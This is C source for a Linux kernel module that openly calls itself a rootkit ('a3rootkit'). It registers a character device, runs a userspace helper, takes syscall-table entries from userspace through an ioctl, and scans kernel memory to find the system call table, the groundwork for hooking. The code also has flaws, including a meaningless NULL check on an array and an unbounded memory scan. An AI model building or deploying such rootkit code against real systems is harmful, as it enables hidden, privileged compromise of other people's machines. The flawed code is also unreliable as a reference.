#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/io.h>

#define DEVICE_NAME "a3rootkit"
#define CLASS_NAME "a3rootkit"

#define USER_KALLSYMS 0x114
static int major_num;
static struct class *module_class;
static struct device *module_device;

size_t* syscall_table = NULL;
size_t syscall_table_data[4];
int get_syscall_table_data = 0;

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_ops = {
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
    .unlocked_ioctl = a3_rootkit_ioctl,
};

void a3_rootkit_find_syscall_table(void)
{
    size_t *phys_mem = (size_t*) page_offset_base;
    char *argv[] = {
        "./kallsyms",
        NULL,
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL,
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    if (!get_syscall_table_data) {
        panic("failed to read syscall table in userspace!");
    }

    if (NULL == syscall_table_data)
    {
        printk("syscall_table_data is null\n");
    }

    printk("syscall_table_data is not empty");
    for (size_t i = 0; 1; i++) {
        /* we only need to compare some of that */
        if (phys_mem[i] == syscall_table_data[0]
            && phys_mem[i + 1] == syscall_table_data[1]
            && phys_mem[i + 2] == syscall_table_data[2]
            && phys_mem[i + 3] == syscall_table_data[3]) {
            syscall_table = &phys_mem[i];
            printk("[a3_rootkit:] found syscall_table at: %lx", 
                   syscall_table);
            break;
        }
    }
}

static int __init a3_rootkit_init(void)
{
    int err_code;

    printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");

    /* register major num as char device */
    major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_ops);
    if(major_num < 0) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register a major number.\n");
        err_code = major_num;
        goto err_major;
    }    
    printk(KERN_INFO "[a3_rootkit:] Register complete, major number: %d\n", 
           major_num);

    /* create device class */
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register class device!\n");
        err_code = PTR_ERR(module_class);
        goto err_class;
    }
    printk(KERN_INFO "[a3_rootkit:] Class device register complete.\n");

    /* create device file */
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), 
                                  NULL, DEVICE_NAME);
    if(IS_ERR(module_device)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to create the device!\n");
        err_code = PTR_ERR(module_device);
        goto err_dev;
    }
    printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");

    a3_rootkit_find_syscall_table();//获取syscall系统调用表
    return 0;

err_dev:
    class_destroy(module_class);
err_class:
    unregister_chrdev(major_num, DEVICE_NAME);
err_major:
    return err_code;
}

static void __exit a3_rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
}

static int a3_rootkit_open(struct inode *inode, struct file *file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file *file, char __user *buf, 
                               size_t count, loff_t *start)
{
    return count;
}

static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                size_t count, loff_t *start)
{
    return count;
}

static int a3_rootkit_release(struct inode *inode, struct file *file)
{
    return 0;
}

static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                             unsigned long arg)
{
    switch (cmd) {
        case USER_KALLSYMS:
            unsigned long result = copy_from_user(syscall_table_data, arg, sizeof(syscall_table_data));
            if(0 == result)
                get_syscall_table_data = 1;
            break;
    }
    return 0;
}

module_init(a3_rootkit_init);
module_exit(a3_rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
